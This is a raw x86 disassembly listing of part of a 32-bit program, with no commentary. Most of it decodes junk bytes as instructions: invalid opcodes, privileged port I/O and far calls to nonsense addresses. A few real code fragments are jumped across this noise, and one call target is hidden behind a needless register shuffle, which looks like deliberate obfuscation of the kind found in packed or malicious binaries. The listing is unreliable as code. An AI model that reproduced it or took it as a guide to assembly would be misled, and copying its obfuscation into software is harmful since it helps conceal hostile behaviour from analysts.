  4050e1:	repnz stos BYTE PTR es:[edi],al
  4050e3:	scas   eax,DWORD PTR es:[edi]
  4050e4:	mul    BYTE PTR [eax-0xe]
  4050e7:	jge    0x405094
  4050e9:	pushf  
  4050ea:	pop    ebx
  4050eb:	repz mov cl,0x1b
  4050ee:	cld    
  4050ef:	int    0x70
  4050f1:	xchg   esp,eax
  4050f2:	add    edx,DWORD PTR [edi-0x142ff10b]
  4050f8:	test   BYTE PTR [esi+0xbf9850c],dl
  4050fe:	jecxz  0x405083
  405100:	int    0x50
  405102:	dec    ebp
  405103:	push   cs
  405104:	mov    ds:0xbc930480,al
  405109:	test   edx,esi
  40510b:	test   DWORD PTR [ebp+0x44],eax
  40510e:	jmp    0x40512d
  405110:	bound  edx,QWORD PTR ss:[eax-0x5ac6454d]
  405117:	push   ss
  405118:	in     eax,dx
  405119:	add    bh,dh
  40511b:	out    0x5b,al
  40511d:	add    BYTE PTR [ecx-0x34],bh
  405120:	xor    BYTE PTR [ebp+0x6f],al
  405123:	out    0xdf,al
  405125:	pop    eax
  405126:	adc    ch,BYTE PTR [edi+0x2c]
  405129:	inc    ebp
  40512a:	jne    0x40511f
  40512c:	mov    eax,ds:0x3f9b537a
  405131:	lock stos BYTE PTR es:[edi],al
  405133:	ja     0x405181
  405135:	add    eax,DWORD PTR [edi+0x3e]
  405138:	popf   
  405139:	pop    ds
  40513a:	ja     0x405130
  40513c:	sahf   
  40513d:	int3   
  40513e:	icebp  
  40513f:	cmp    DWORD PTR [eax+0x65c9fcd0],ebp
  405145:	inc    eax
  405146:	pop    eax
  405147:	pop    edi
  405148:	xchg   BYTE PTR [edi-0x5d51629d],cl
  40514e:	iret   
  40514f:	iret   
  405150:	push   esi
  405151:	and    bh,BYTE PTR [eax]
  405153:	in     al,0x50
  405155:	mov    DWORD PTR ds:0x412358,0x10
  40515f:	cmp    DWORD PTR ds:0x412358,0x0
  405166:	je     0x4051ac
  40516c:	cmp    DWORD PTR ds:0x412358,0x4
  405173:	jne    0x405184
  405179:	push   0x4150fd
  40517e:	call   DWORD PTR ds:0x40d1c8
  405184:	cmp    DWORD PTR ds:0x412358,0x5
  40518b:	jne    0x40519c
  405191:	mov    eax,ds:0x412358
  405196:	dec    eax
  405197:	mov    ds:0x412358,eax
  40519c:	mov    eax,ds:0x412358
  4051a1:	dec    eax
  4051a2:	mov    ds:0x412358,eax
  4051a7:	jmp    0x40515f
  4051ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4051af:	xor    eax,esi
  4051b1:	add    eax,edi
  4051b3:	jmp    0x40532c
  4051b8:	(bad)  
  4051b9:	sbb    BYTE PTR [ecx+eiz*1],ah
  4051bc:	clc    
  4051bd:	and    ebx,ebp
  4051bf:	fldcw  WORD PTR [esi-0xdf0698e]
  4051c5:	arpl   WORD PTR [edi],sp
  4051c7:	retf   0x704a
  4051ca:	jle    0x40524a
  4051cc:	fidivr DWORD PTR [edi+0x7e]
  4051cf:	jle    0x40519e
  4051d1:	test   DWORD PTR [eax+ebx*1],ebp
  4051d4:	sbb    dh,BYTE PTR [esi]
  4051d6:	push   ebp
  4051d7:	fidiv  WORD PTR [edi-0xff327ad]
  4051dd:	(bad)  
  4051de:	mov    ebx,0xffc8d042
  4051e3:	pop    eax
  4051e4:	(bad)  
  4051e6:	ret    
  4051e7:	das    
  4051e8:	xchg   ebx,eax
  4051e9:	mov    ecx,0xa0a337f1
  4051ee:	sbb    edx,DWORD PTR [eax+0x1b]
  4051f1:	mov    ecx,0xa349a3e8
  4051f6:	outs   dx,BYTE PTR ds:[esi]
  4051f7:	ds mov dh,0x4b
  4051fa:	repnz pop esp
  4051fc:	mov    ch,0x37
  4051fe:	aad    0x2e
  405200:	jb     0x4051ec
  405202:	stos   DWORD PTR es:[edi],eax
  405203:	or     eax,0xe4843617
  405208:	into   
  405209:	ss mov dl,0x4a
  40520c:	mov    esi,ecx
  40520e:	int    0x67
  405210:	(bad)  
  405211:	jns    0x4051bc
  405213:	loope  0x4051ac
  405215:	ret    0x58ff
  405218:	xchg   BYTE PTR [ebp-0x1b],dl
  40521b:	mov    ds:0x74c3ed68,al
  405220:	in     eax,0x52
  405222:	jne    0x4051d6
  405224:	jmp    0x4051cf
  405226:	lahf   
  405227:	dec    edx
  405228:	ins    DWORD PTR es:[edi],dx
  405229:	add    eax,0x8df73916
  40522e:	nop
  40522f:	mov    ah,0x6a
  405231:	std    
  405232:	adc    esp,ebx
  405234:	push   edi
  405235:	mov    al,0x19
  405237:	data16 daa 
  405239:	icebp  
  40523a:	ins    BYTE PTR es:[edi],dx
  40523b:	sti    
  40523c:	stos   BYTE PTR es:[edi],al
  40523d:	mov    ah,0xcc
  40523f:	mov    dh,0x36
  405241:	xchg   edi,eax
  405242:	push   0x0
  405244:	cli    
  405245:	ret    
  405246:	jge    0x405273
  405248:	mov    ah,0x17
  40524a:	jp     0x405238
  40524c:	loope  0x40525c
  40524e:	mov    BYTE PTR [edx+0x79],bl
  405251:	clc    
  405252:	addr16 jl 0x4051e0
  405255:	and    al,0x2d
  405257:	data16 (bad) 
  405259:	fsubr  QWORD PTR [ebp-0x5c]
  40525c:	mov    ds:0xd1567610,eax
  405261:	jmp    0x79a6e82a
  405266:	mov    BYTE PTR [ebp+0xe],0xb7
  40526a:	dec    ebx
  40526b:	push   ebp
  40526c:	adc    cl,dl
  40526e:	aad    0x8a
  405270:	cmp    DWORD PTR [ebx+edi*2],esp
  405273:	ret    
  405274:	sti    
  405275:	fwait
  405276:	aad    0xbc
  405278:	fmul   QWORD PTR ds:0x8c700cc3
  40527e:	das    
  40527f:	mul    BYTE PTR [eax-0x41414549]
  405285:	icebp  
  405286:	adc    BYTE PTR ss:[ebx+0x34],bl
  40528a:	dec    ebx
  40528b:	arpl   WORD PTR [eax-0x51],ax
  40528e:	mov    cl,0x9a
  405290:	out    0xd4,eax
  405292:	add    edx,eax
  405294:	(bad)  
  405295:	push   ebp
  405296:	dec    edi
  405297:	dec    ebp
  405298:	in     eax,0x7d
  40529a:	inc    ebp
  40529b:	stc    
  40529c:	pop    esp
  40529d:	lods   al,BYTE PTR ds:[esi]
  40529e:	ins    DWORD PTR es:[edi],dx
  40529f:	pop    esp
  4052a0:	jno    0x405258
  4052a2:	jg     0x4052e3
  4052a4:	and    eax,DWORD PTR [edi-0x70]
  4052a7:	and    BYTE PTR [ebp-0x9],ch
  4052aa:	dec    ebx
  4052ab:	jnp    0x405326
  4052ad:	je     0x4052f0
  4052af:	(bad)  
  4052b0:	(bad)  [eax-0x48cfeb08]
  4052b6:	dec    edi
  4052b7:	lods   al,BYTE PTR ds:[esi]
  4052b8:	loop   0x405258
  4052ba:	aad    0x59
  4052bc:	jmp    0x94adaa38
  4052c1:	ret    0xe0f9
  4052c4:	dec    edi
  4052c5:	push   0x5e
  4052c7:	dec    ebx
  4052c8:	push   cs
  4052c9:	into   
  4052ca:	test   edi,0x77a2c06b
  4052d0:	mov    eax,ds:0xc9089a03
  4052d5:	mov    ds,WORD PTR [esi+0x15843548]
  4052db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052dc:	mov    cr3,edx
  4052df:	mov    ebp,edx
  4052e1:	pop    eax
  4052e2:	mov    ebp,0xbb30e9bb
  4052e7:	(bad)
  4052ec:	(bad)  
  4052ee:	xor    ebp,eax
  4052f0:	push   edx
  4052f1:	leave  
  4052f2:	ror    cl,0x3c
  4052f5:	xchg   esi,eax
  4052f6:	push   ebp
  4052f7:	cmp    al,0xeb
  4052f9:	mov    dl,0x14
  4052fb:	mov    BYTE PTR [edi-0x24ffe9f7],bl
  405301:	push   0x97a5cb5a
  405306:	(bad)  [ecx+0x11618fdb]
  40530c:	sub    DWORD PTR [eax+0x7d41107],esi
  405312:	xchg   edi,eax
  405313:	fimul  DWORD PTR [ebp+0x2521943]
  405319:	mov    esp,0x19eaf357
  40531e:	jecxz  0x4052a8
  405320:	clc    
  405321:	stc    
  405322:	ret    
  405323:	dec    BYTE PTR [ecx-0x4]
  405326:	add    al,0x7b
  405329:	shl    DWORD PTR [ecx+0x1d],0x50
  40532d:	push   DWORD PTR [ebp-0x8]
  405330:	lea    eax,[ebp-0x78]
  405333:	push   eax
  405334:	push   DWORD PTR [ebp-0xc]
  405337:	push   DWORD PTR [ebp-0x14]
  40533a:	jmp    0x4054b3
  40533f:	loop   0x40534f
  405341:	cli    
  405342:	cs cli 
  405344:	cli    
  405345:	cli    
  405346:	ret    0x10db
  405349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534a:	push   esp
  40534b:	pop    ss
  40534c:	and    al,BYTE PTR [ebx+0x7e761613]
  405352:	jle    0x40532e
  405354:	jg     0x4053d4
  405356:	jle    0x405342
  405358:	lods   eax,DWORD PTR ds:[esi]
  405359:	popf   
  40535a:	jbe    0x405325
  40535c:	loopne 0x40535c
  40535e:	pop    ds
  40535f:	and    ebp,DWORD PTR [ebx+0x7b6cf4f6]
  405365:	sar    bh,0xb7
  405368:	jge    0x4052fc
  40536a:	pop    eax
  40536b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40536c:	inc    edi
  40536d:	pusha  
  40536e:	arpl   WORD PTR [edx+0xce9f517],di
  405374:	add    eax,DWORD PTR [edx]
  405376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405377:	daa    
  405378:	shl    esp,1
  40537a:	and    cl,BYTE PTR [edx-0x3136901]
  405380:	arpl   WORD PTR [edx+0x29434653],bx
  405386:	(bad)  
  405387:	jle    0x40532f
  405389:	icebp  
  40538a:	stos   BYTE PTR es:[edi],al
  40538b:	packssdw mm0,mm3
  40538e:	rcl    bl,1
  405390:	mov    ebp,0xa53863e4
  405395:	jge    0x4053cd
  405397:	jecxz  0x40533c
  405399:	cmp    BYTE PTR [ebp+0x44],ch
  40539c:	aaa    
  40539d:	test   esp,edi
  40539f:	pushf  
  4053a0:	push   ds
  4053a1:	sbb    BYTE PTR [eax+ecx*4],ch
  4053a4:	lea    esi,[ecx-0x71]
  4053a7:	xor    ecx,DWORD PTR [eax-0x6d]
  4053aa:	arpl   WORD PTR ds:0xfde8f156,dx
  4053b0:	jno    0x4053d7
  4053b2:	aas    
  4053b3:	inc    ebp
  4053b4:	out    0xdd,al
  4053b6:	popf   
  4053b7:	aas    
  4053b8:	popf   
  4053b9:	xor    eax,0x8fe160f3
  4053be:	or     eax,0x4cd473b8
  4053c3:	cli    
  4053c4:	in     al,0xd6
  4053c6:	jb     0x4053a9
  4053c8:	cmc    
  4053c9:	in     eax,dx
  4053ca:	push   ss
  4053cb:	pop    ss
  4053cc:	jno    0x405359
  4053ce:	jle    0x405416
  4053d0:	mov    ebp,0x47919d11
  4053d5:	jnp    0x4053a1
  4053d7:	pop    ds
  4053d8:	iret   
  4053d9:	ins    BYTE PTR es:[edi],dx
  4053da:	push   edx
  4053db:	xchg   esi,eax
  4053dc:	pop    ss
  4053dd:	mov    esi,0xb5f14748
  4053e2:	out    dx,al
  4053e3:	sub    eax,eax
  4053e5:	and    eax,0x2711166e
  4053ea:	ins    BYTE PTR es:[edi],dx
  4053eb:	repz xchg esi,eax
  4053ed:	jecxz  0x4053cb
  4053ef:	(bad)  
  4053f0:	dec    edx
  4053f1:	xchg   edx,eax
  4053f2:	jb     0x4053aa
  4053f4:	push   esp
  4053f5:	shr    BYTE PTR [ebp+0x2e6b4d58],0xcb
  4053fc:	jp     0x40541d
  4053fe:	rol    DWORD PTR [edx+0x17],0x59
  405402:	popa   
  405403:	adc    al,BYTE PTR [ecx]
  405405:	sahf   
  405406:	dec    eax
  405407:	mov    al,ds:0xb7365333
  40540c:	push   0xffffffa1
  40540e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40540f:	xor    eax,0x2da97cf9
  405414:	mov    DWORD PTR [esi],eax
  405416:	ja     0x40541a
  405418:	mov    esi,0x82d06861
  40541d:	repnz out 0x46,al
  405420:	test   DWORD PTR [esi-0x9],ebp
  405423:	aas    
  405424:	add    eax,0x6b25de7a
  405429:	push   ss
  40542a:	inc    BYTE PTR ds:0xdad8af9
  405430:	cmp    ch,ch
  405432:	mov    dl,0x90
  405434:	fsub   QWORD PTR [eax+0x4aafec29]
  40543a:	sbb    al,0x7
  40543c:	and    eax,0x3233180c
  405441:	test   al,0xa5
  405443:	out    0xed,eax
  405445:	stc    
  405446:	xchg   esi,eax
  405447:	mov    ah,0xa1
  405449:	scas   eax,DWORD PTR es:[di]
  40544b:	test   BYTE PTR [ebx-0x53c506a7],dl
  405451:	pusha  
  405452:	stos   BYTE PTR es:[edi],al
  405453:	clc    
  405454:	cmp    DWORD PTR [ecx],ebx
  405456:	ds out 0x16,al
  405459:	sub    ecx,esp
  40545b:	ins    DWORD PTR es:[edi],dx
  40545c:	mov    WORD PTR [ebx],?
  40545e:	into   
  40545f:	mov    ebp,0xb61508cc
  405464:	pop    edx
  405465:	repz jl 0x4053fb
  405468:	add    cl,al
  40546a:	mov    ch,0x12
  40546c:	push   edx
  40546d:	sti    
  40546e:	outs   dx,BYTE PTR ds:[esi]
  40546f:	xor    BYTE PTR [ecx+0x1db3ac6f],ah
  405475:	cmp    ebp,DWORD PTR [esi+0x2b]
  405478:	jecxz  0x4054bb
  40547a:	dec    edi
  40547b:	jg     0x405477
  40547d:	in     eax,dx
  40547e:	and    BYTE PTR [ecx-0x69],ah
  405481:	mov    dh,0x71
  405483:	add    al,0xad
  405485:	mov    esi,0x1a3e156
  40548a:	cmp    BYTE PTR [ebx],bh
  40548c:	inc    esi
  40548d:	dec    esi
  40548e:	or     edi,DWORD PTR [edx]
  405490:	stc    
  405491:	mov    ah,0xd7
  405493:	leave  
  405494:	in     eax,0x28
  405496:	dec    esp
  405497:	scas   al,BYTE PTR es:[edi]
  405498:	cdq    
  405499:	xchg   edx,eax
  40549a:	add    al,ch
  40549c:	mov    ecx,0x37ef7d6a
  4054a1:	fwait
  4054a2:	adc    DWORD PTR [eax-0x49fbe035],ecx
  4054a8:	mov    ebp,0xdeb1f537
  4054ad:	call   0xe8a3:0x5f7ffd06
  4054b4:	dec    edi
  4054b5:	inc    ecx
  4054b6:	add    BYTE PTR [eax],al
  4054b8:	test   eax,eax
  4054ba:	je     0x4054e5
  4054c0:	lea    eax,[ebp-0x78]
  4054c3:	push   eax
  4054c4:	mov    eax,DWORD PTR [ebp-0x14]
  4054c7:	xor    eax,esi
  4054c9:	add    eax,edi
  4054cb:	push   eax
  4054cc:	mov    eax,DWORD PTR [ebp-0x10]
  4054cf:	add    eax,0xee
  4054d4:	push   eax
  4054d5:	mov    eax,DWORD PTR [ebp-0x10]
  4054d8:	mov    eax,DWORD PTR [eax+0x198]
  4054de:	push   DWORD PTR [eax]
  4054e0:	call   0x40ae4d
  4054e5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4054e8:	xor    ecx,esi
  4054ea:	mov    eax,0xffcd8d61
  4054ef:	sub    eax,ecx
  4054f1:	sub    eax,DWORD PTR [ebp-0x8]
  4054f4:	mov    ecx,DWORD PTR [ebp-0x30]
  4054f7:	add    ecx,eax
  4054f9:	mov    eax,DWORD PTR [ebp-0x8]
  4054fc:	jmp    0x405675
  405501:	lahf   
  405502:	(bad)  
  405503:	icebp  
  405504:	shl    DWORD PTR [ecx-0x50bea01f],1
  40550a:	icebp  
  40550b:	add    DWORD PTR [edi+0x63],0x14
  40550f:	lock loop 0x405504
  405512:	ja     0x405592
  405514:	jle    0x4054f0
  405516:	jg     0x405596
  405518:	jle    0x405546
  40551a:	mov    ds:0xc12cac5e,al
  40551f:	pop    es
  405520:	(bad)  
  405521:	(bad)  
  405522:	mov    bh,0x2c
  405524:	call   0xcfaf:0xd9addcb5
  40552b:	fistp  WORD PTR [edi+0x31]
  40552e:	sub    DWORD PTR [edi],ebx
  405530:	mov    bl,0x91
  405532:	addr16 repnz add al,0x60
  405536:	sahf   
  405537:	shl    ebx,0x27
  40553a:	mov    bl,0x16
  40553c:	cmp    al,BYTE PTR [ecx-0x54bc0290]
  405542:	pop    ebp
  405543:	ins    DWORD PTR es:[edi],dx
  405544:	cmp    eax,0x67b00260
  405549:	bound  eax,QWORD PTR [ecx]
  40554b:	es add eax,0x52985c0e
  405551:	push   ebx
  405552:	stc    
  405553:	cwde   
  405554:	dec    edi
  405555:	mov    ah,0x1
  405558:	(bad)  
  405559:	loop   0x405522
  40555b:	and    al,0x70
  40555d:	push   edi
  40555e:	jb     0x405530
  405560:	cmp    al,0xc8
  405562:	xor    al,0xfc
  405564:	in     al,0x68
  405566:	in     al,dx
  405567:	cdq    
  405568:	and    eax,0xda4062aa
  40556d:	imul   esi,DWORD PTR [edi+0x40],0x57
  405571:	fidiv  WORD PTR [eax+0x49a524df]
  405577:	adc    al,0x18
  405579:	inc    esp
  40557a:	mov    DWORD PTR [ecx-0x3c83b3b4],esi
  405580:	adc    DWORD PTR [eax+0x2bce72cf],ecx
  405586:	gs cmc 
  405588:	jg     0x405538
  40558a:	lds    esi,FWORD PTR [edx+0x33]
  40558d:	mov    ebx,0xab594c46
  405592:	add    ecx,DWORD PTR [ecx]
  405594:	in     al,0x45
  405596:	sbb    bl,BYTE PTR [edi-0x46]
  405599:	fnstcw WORD PTR [ebx]
  40559b:	cs add eax,0x7bdaa945
  4055a1:	xor    al,0xb4
  4055a3:	or     cl,BYTE PTR [edi-0x43783e4d]
  4055a9:	jl     0x4055cc
  4055ab:	iret   
  4055ac:	fld    TBYTE PTR [ecx-0x29]
  4055af:	jne    0x405618
  4055b1:	test   DWORD PTR [ebx],esi
  4055b3:	out    dx,eax
  4055b4:	out    dx,al
  4055b5:	xor    esp,DWORD PTR [edx]
  4055b7:	jg     0x4055fd
  4055b9:	dec    eax
  4055ba:	pop    edx
  4055bb:	aaa    
  4055bc:	aad    0x3e
  4055be:	jmp    0x7bb5:0xe14dc724
  4055c5:	lods   eax,DWORD PTR ds:[esi]
  4055c6:	dec    esp
  4055c7:	xor    esp,ebp
  4055c9:	mov    al,0x83
  4055cb:	jno    0x405613
  4055cd:	sbb    dh,bh
  4055cf:	pop    ecx
  4055d0:	call   0xbc802d42
  4055d5:	mov    edi,0x6d33c6c
  4055da:	fwait
  4055db:	mov    al,BYTE PTR [esi]
  4055dd:	inc    edi
  4055de:	mov    edi,0x736653d8
  4055e3:	arpl   WORD PTR [ebx+esi*2+0x77],ax
  4055e7:	(bad)  
  4055e9:	pop    ebp
  4055ea:	push   ds
  4055eb:	out    0x0,eax
  4055ed:	and    esi,ebp
  4055ef:	jge    0x4055ab
  4055f1:	xor    ebp,DWORD PTR [ebp-0x3252abb9]
  4055f7:	mov    cl,0x6a
  4055f9:	pop    eax
  4055fa:	adc    ch,BYTE PTR [edx]
  4055fc:	or     bh,bh
  4055fe:	mov    al,0xcc
  405600:	fdivr  QWORD PTR [ebp-0x26]
  405603:	mov    edi,0x7c343e2d
  405608:	mov    BYTE PTR [ebx+0x53e5722],0x3e
  40560f:	sub    eax,0x73dfa53a
  405614:	fwait
  405615:	out    0x10,al
  405617:	arpl   WORD PTR [ebp-0x414adf49],sp
  40561d:	mov    dh,0xad
  40561f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405620:	ds cdq 
  405622:	scas   eax,DWORD PTR es:[edi]
  405623:	inc    esi
  405624:	mov    ch,0xa
  405626:	xchg   ecx,eax
  405627:	xchg   ebp,eax
  405628:	pop    ebx
  405629:	in     al,0xbb
  40562b:	dec    ebp
  40562c:	pop    es
  40562d:	inc    esp
  40562e:	cs sbb bl,0x92
  405632:	(bad)  
  405633:	out    dx,eax
  405634:	daa    
  405635:	sbb    eax,0x8d5f115a
  40563a:	fsub   DWORD PTR [esi-0x39334f20]
  405640:	or     esi,DWORD PTR [edx+0x63ca569c]
  405646:	jb     0x40560b
  405648:	out    0x4,eax
  40564a:	add    dl,dh
  40564c:	mov    eax,ds:0xaa3d87f5
  405651:	aas    
  405652:	xlat   BYTE PTR ds:[ebx]
  405653:	sbb    edi,DWORD PTR [eax+0x615353f6]
  405659:	push   edi
  40565a:	jae    0x4056d8
  40565c:	fcom   DWORD PTR [eax+0x7d74b2c9]
  405662:	iret   
  405663:	sub    eax,0x2d79d8d8
  405668:	dec    ecx
  405669:	push   edx
  40566a:	mov    edi,0xb8c5082a
  40566f:	stc    
  405670:	lds    eax,FWORD PTR ds:0x895aded6
  405676:	dec    eax
  405677:	add    DWORD PTR [edx+0x4d8bff45],ecx
  40567d:	clc    
  40567e:	xor    al,0x4a
  405680:	sub    al,0x34
  405682:	mov    BYTE PTR [ecx],al
  405684:	lea    eax,[ebp-0x8]
  405687:	inc    BYTE PTR [eax]
  405689:	inc    eax
  40568a:	push   eax
  40568b:	pop    ecx
  40568c:	dec    ecx
  40568d:	xchg   ecx,edx
  40568f:	jmp    0x405808
  405694:	mov    gs,WORD PTR [edi+0x79]
  405697:	in     eax,0x79
  405699:	stc    
  40569a:	and    BYTE PTR [ebp-0x3],0xf5
  40569e:	cmp    esp,eax
  4056a0:	add    ah,BYTE PTR [ebp-0x1c]
  4056a3:	cmp    BYTE PTR [esi+0x74],bl
  4056a6:	jle    0x405726
  4056a8:	fidivr DWORD PTR [edi+0x7e]
  4056ab:	jle    0x4056b8
  4056ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056ae:	jae    0x40568d
  4056b0:	loopne 0x40569c
  4056b2:	mov    edi,0xd688664e
  4056b7:	add    dl,BYTE PTR [edx+0xd2b60bf]
  4056bd:	test   edi,esi
  4056bf:	ret    
  4056c0:	sub    BYTE PTR [eax+0x339aa983],bh
  4056c6:	test   eax,0x5db71579
  4056cb:	cmc    
  4056cc:	(bad)  
  4056cd:	inc    si
  4056cf:	cmp    DWORD PTR [eax],edx
  4056d1:	sbb    eax,0xd03e832
  4056d6:	lgs    edi,FWORD PTR [edx+0x1]
  4056da:	fcmovb st,st(5)
  4056dc:	cmc    
  4056dd:	ret    0x3bb6
  4056e0:	add    DWORD PTR [eax+esi*4],edi
  4056e3:	leave  
  4056e4:	push   esi
  4056e5:	mov    ds:0x461cdcd6,eax
  4056ea:	mov    ch,0x1d
  4056ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056ed:	les    edi,FWORD PTR [esp+ebp*8-0x339ef169]
  4056f4:	adc    al,BYTE PTR [ebx-0x55]
  4056f7:	dec    edi
  4056f8:	ja     0x405716
  4056fa:	out    0x75,eax
  4056fc:	jae    0x4056eb
  4056fe:	or     eax,0xb745dc99
  405703:	xor    DWORD PTR [ebp+0x5e],ebx
  405706:	pop    ebp
  405707:	sub    ch,BYTE PTR [esi-0x48]
  40570a:	mov    eax,ds:0x17b8d577
  40570f:	call   0xd511:0xcf6cc0c9
  405716:	mov    al,0x9d
  405718:	retf   
  405719:	push   ss
  40571a:	les    esi,FWORD PTR [ecx+0x349b39e1]
  405720:	stos   DWORD PTR es:[edi],eax
  405721:	rcr    BYTE PTR [edi-0x3eaad5d1],0xaf
  405728:	leave  
  405729:	out    dx,al
  40572a:	xor    BYTE PTR [edx+0x76],ah
  40572d:	sbb    eax,0xf43111cc
  405732:	xor    DWORD PTR [ecx],edx
  405734:	int    0x63
  405736:	jbe    0x8d465f7b
  40573c:	and    al,al
  40573e:	cmp    edx,0x3f7411f4
  405744:	jge    0x40578c
  405746:	mov    esp,0x3a8d2715
  40574b:	lea    esi,[edi+0x4a3b8525]
  405751:	daa    
  405752:	leave  
  405753:	xor    dl,BYTE PTR [edi-0x3108d691]
  405759:	nop
  40575a:	cmc    
  40575b:	xchg   BYTE PTR [edi],ch
  40575d:	cmp    esi,0xffffffe9
  405760:	mov    al,0x9b
  405762:	fisub  WORD PTR [edx+0x7b]
  405765:	in     al,dx
  405766:	nop
  405767:	xor    al,0x79
  405769:	xor    al,0xc3
  40576b:	bound  ebp,QWORD PTR [edi+0x3d80684d]
  405771:	push   cs
  405772:	cmp    al,0x2b
  405774:	call   0xf037871d
  405779:	call   0x8567227d
  40577e:	mov    al,BYTE PTR ds:0xf205
  405783:	push   edi
  405784:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405786:	sub    al,0x1
  405788:	mov    eax,0x6e1dff63
  40578d:	int3   
  40578e:	pop    ebx
  40578f:	fsubr  QWORD PTR [esi-0x1295c17a]
  405795:	cmp    BYTE PTR [ebp+0x69],ch
  405798:	jecxz  0x4057b7
  40579a:	daa    
  40579b:	adc    BYTE PTR [ecx-0x74],ch
  40579e:	xchg   DWORD PTR [eax-0x7f9d6fa1],esp
  4057a4:	mov    esp,0x18c0980c
  4057a9:	and    al,0xa
  4057ab:	pop    es
  4057ac:	inc    esi
  4057ad:	lods   al,BYTE PTR ds:[esi]
  4057ae:	xchg   ebx,eax
  4057af:	ins    BYTE PTR es:[edi],dx
  4057b0:	shl    ch,0x5e
  4057b3:	mov    esi,0xb74458ec
  4057b8:	xor    BYTE PTR [edi+0x150710c8],dl
  4057be:	inc    ebx
  4057bf:	dec    edi
  4057c0:	imul   eax,DWORD PTR [ebp+0xe55db63],0x31
  4057c7:	mov    ebx,0x856f0bc4
  4057cc:	inc    edx
  4057cd:	bound  esp,QWORD PTR [ecx]
  4057cf:	cs dec esp
  4057d1:	adc    bl,BYTE PTR [eax]
  4057d3:	mov    edx,0x5780c258
  4057d8:	sub    al,0x51
  4057da:	adc    ch,0x3f
  4057dd:	sti    
  4057de:	outs   dx,BYTE PTR ds:[esi]
  4057df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057e0:	aam    0xde
  4057e2:	popf   
  4057e3:	enter  0xbdb4,0xe6
  4057e7:	and    edx,ecx
  4057e9:	push   esi
  4057ea:	neg    BYTE PTR [eax+0x65cd3bb3]
  4057f0:	jp     0x405782
  4057f2:	xchg   edx,eax
  4057f3:	test   eax,0xab1b1a9
  4057f8:	adc    BYTE PTR [ebp+0x4f],bl
  4057fb:	inc    ebx
  4057fc:	sbb    cl,dl
  4057fe:	jbe    0x40579d
  405800:	xor    bl,BYTE PTR [eax+esi*2]
  405803:	jp     0x4057a8
  405805:	push   ecx
  405806:	ins    DWORD PTR es:[edi],dx
  405807:	retf   0xafe
  40580a:	push   DWORD PTR [ebp-0x10]
  40580d:	mov    eax,ds:0x40d68c
  405812:	mov    eax,DWORD PTR [eax]
  405814:	push   DWORD PTR [eax]
  405816:	lea    eax,ds:0x40d6a8
  40581c:	push   DWORD PTR [eax]
  40581e:	lea    eax,ds:0x40d454
  405824:	push   DWORD PTR [eax]
  405826:	lea    eax,ds:0x40d688
  40582c:	push   DWORD PTR [eax]
  40582e:	lea    eax,ds:0x40d784
  405834:	push   DWORD PTR [eax]
  405836:	xchg   ebx,edx
  405838:	inc    ebx
  405839:	inc    ebx
  40583a:	sub    ebx,0x3
  40583d:	push   ebx
  40583e:	pop    eax
  40583f:	call   DWORD PTR [eax+0x1]
  405842:	mov    eax,DWORD PTR [ebp-0x20]
  405845:	jmp    0x4059be
  40584a:	mov    WORD PTR [edx+ebx*8+0x33],es
  40584e:	fidiv  DWORD PTR [ecx+0x8615985]
  405854:	or     al,0x32
  405856:	dec    ebp
  405857:	iret   
  405858:	scas   eax,DWORD PTR es:[edi]
  405859:	out    0x3a,al
  40585b:	or     bh,BYTE PTR [esi+0x7e]
  40585e:	fidivr DWORD PTR [edi+0x7e]
  405861:	jle    0x405861
  405863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405864:	dec    ecx
  405865:	int    0x40
  405867:	pop    edi
  405868:	enter  0xd22f,0x13
  40586c:	xor    al,0xb6
  40586e:	jmp    0x405831
  405870:	mov    bl,BYTE PTR [eax+0x4a8304b6]
  405876:	ret    
  405877:	jo     0x40580a
  405879:	lods   al,BYTE PTR ds:[esi]
  40587a:	inc    ebp
  40587b:	mov    al,0x64
  40587d:	and    BYTE PTR [edi+0x52],ch
  405880:	and    ebp,edx
  405882:	push   0xffffffb3
  405884:	loope  0x405808
  405886:	add    al,0x11
  405888:	jns    0x4058bf
  40588a:	push   cs
  40588b:	stos   BYTE PTR es:[edi],al
  40588c:	and    dh,cl
  40588e:	fnstsw WORD PTR [edx]
  405890:	jle    0x405871
  405892:	cmp    DWORD PTR ds:0xc762ced9,esp
  405898:	out    0xaa,al
  40589a:	bound  edi,QWORD PTR [ebp+0x9]
  40589d:	ret    
  40589e:	dec    edi
  40589f:	push   ss
  4058a0:	inc    eax
  4058a1:	xchg   DWORD PTR [ecx+0x7a],esp
  4058a4:	mov    eax,0x9f32b495
  4058a9:	neg    BYTE PTR [eax-0x1648b79d]
  4058af:	in     al,dx
  4058b0:	push   ecx
  4058b1:	mov    cl,0x4f
  4058b3:	mov    BYTE PTR [eax-0x4dbcb14c],cl
  4058b9:	xchg   ebx,eax
  4058ba:	push   eax
  4058bb:	leave  
  4058bc:	adc    cl,BYTE PTR ds:0x9cb826a0
  4058c2:	push   eax
  4058c3:	dec    ecx
  4058c4:	adc    BYTE PTR [ecx],ch
  4058c6:	inc    esp
  4058c7:	adc    DWORD PTR [eax],0x8a0a25c4
  4058cd:	test   eax,0x3653c0be
  4058d2:	stos   DWORD PTR es:[edi],eax
  4058d3:	inc    ecx
  4058d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058d5:	cmp    eax,0xff505085
  4058da:	push   0x1fa5f658
  4058df:	or     DWORD PTR ds:0x8bf2524d,esi
  4058e5:	push   ds
  4058e6:	pop    esp
  4058e7:	mov    ds:0x6633a4e1,al
  4058ec:	in     al,dx
  4058ed:	or     BYTE PTR [esi+0x34604433],al
  4058f3:	inc    ecx
  4058f4:	aad    0xa0
  4058f6:	mov    eax,ds:0xbdc6612a
  4058fb:	cs sub edi,0x588d7a34
  405902:	jne    0x4058ae
